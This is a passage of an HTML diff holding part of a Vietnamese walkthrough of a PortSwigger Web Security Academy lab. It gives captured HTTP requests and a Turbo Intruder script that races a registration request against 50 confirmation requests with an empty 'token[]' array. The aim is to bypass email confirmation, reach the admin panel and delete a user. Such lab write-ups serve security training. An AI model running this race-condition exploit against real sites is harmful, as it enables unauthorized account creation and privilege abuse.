+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aaa005c041d082083fcf075009700f1.web-security-academy.net/register</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">sg4UBDyqdFPuhePPvPA2sgTkUqGkGfrq</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="mf">11</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">aaa21</span><span class="o">%</span><span class="mf">40</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+<li>
+<p>API <code>POST /confirm</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">confirm</span><span class="o">?</span><span class="nx">token</span><span class="p">[]</span><span class="o">=</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">aaa005c041d082083fcf075009700f1</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="nx">DDDALC9UwlBKnbzppJaeZFU5A4EZdEDW</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aaa005c041d082083fcf075009700f1.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aaa005c041d082083fcf075009700f1.web-security-academy.net/register</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Mở extension Turbo Intruder và chèn 2 request trên như sau:</p>
+<ul>
+<li>
+<p>Turbo intruder config</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+<li>
+<p>Phần code như sau</p>
+<div class="highlight"><pre><span></span><code><span class="nx">def</span><span class="w"> </span><span class="nx">queueRequests</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">wordlists</span><span class="p">)</span><span class="o">:</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">supports</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="nx">specify</span><span class="w"> </span><span class="nx">engine</span><span class="o">=</span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP2</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">trigger</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">single</span><span class="o">-</span><span class="nx">packet</span><span class="w"> </span><span class="nx">attack</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">they</span><span class="w"> </span><span class="nx">only</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">Engine</span><span class="p">.</span><span class="nx">THREADED</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP</span><span class="w"> </span><span class="nx">instead</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">information</span><span class="p">,</span><span class="w"> </span><span class="nx">check</span><span class="w"> </span><span class="nx">out</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//portswigger.net/research/smashing-the-state-machine</span>
+<span class="w">    </span><span class="nx">engine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RequestEngine</span><span class="p">(</span><span class="nx">endpoint</span><span class="o">=</span><span class="s1">&#39;https://0aaa005c041d082083fcf075009700f1.web-security-academy.net:443&#39;</span><span class="p">,</span>
+<span class="w">                           </span><span class="nx">concurrentConnections</span><span class="o">=</span><span class="mf">1</span><span class="p">,</span>
+<span class="w">                           </span><span class="nx">engine</span><span class="o">=</span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP2</span>
+<span class="w">                           </span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">req1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="s1">&#39;&#39;&#39;&lt;REQ1&gt;&#39;&#39;&#39;</span>
+
+<span class="w">    </span><span class="nx">req2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="s1">&#39;&#39;&#39;&lt;REQ2&gt;&#39;&#39;&#39;</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">range</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">gate_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;race_&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">str</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;dat&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">str</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
+
+<span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="nx">Gửi</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">đăng</span><span class="w"> </span><span class="nx">ký</span><span class="w"> </span><span class="nx">với</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nx">và</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">mới</span>
+<span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="nx">Turbo</span><span class="w"> </span><span class="nx">Intruder</span><span class="w"> </span><span class="nx">sẽ</span><span class="w"> </span><span class="nx">thay</span><span class="w"> </span><span class="nx">các</span><span class="w"> </span><span class="o">%</span><span class="nx">s</span><span class="w"> </span><span class="nx">theo</span><span class="w"> </span><span class="nx">thứ</span><span class="w"> </span><span class="nx">tự</span><span class="w"> </span><span class="nx">trong</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="p">[</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">]</span>
+<span class="w">        </span><span class="nx">engine</span><span class="p">.</span><span class="nx">queue</span><span class="p">(</span><span class="nx">req1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">],</span><span class="w"> </span><span class="nx">gate</span><span class="o">=</span><span class="nx">gate_name</span><span class="p">)</span>
+
+<span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="nx">Gửi</span><span class="w"> </span><span class="nx">kèm</span><span class="w"> </span><span class="mf">50</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">xác</span><span class="w"> </span><span class="nx">nhận</span><span class="w"> </span><span class="nx">vào</span><span class="w"> </span><span class="nx">cùng</span><span class="w"> </span><span class="nx">một</span><span class="w"> </span><span class="nx">gate</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">range</span><span class="p">(</span><span class="mf">50</span><span class="p">)</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">engine</span><span class="p">.</span><span class="nx">queue</span><span class="p">(</span><span class="nx">req2</span><span class="p">,</span><span class="w"> </span><span class="nx">gate</span><span class="o">=</span><span class="nx">gate_name</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">engine</span><span class="p">.</span><span class="nx">openGate</span><span class="p">(</span><span class="nx">gate_name</span><span class="p">)</span>
+
+<span class="nx">def</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">interesting</span><span class="p">)</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">table</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Cần chú ý chèn thêm placeholder vào param <code>username</code> và <code>email</code></p>
+<p><img alt="image.png" src="image%2036.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện chạy attack, nhận thấy account <code>dat4</code> đã thành công</p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+<li>
+<p>Thực hiện login thành công. Điều hướng đến chức năng <code>Admin panel</code></p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+</li>
+<li>
+<p>Thực hiện xóa user <code>carlos</code> thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
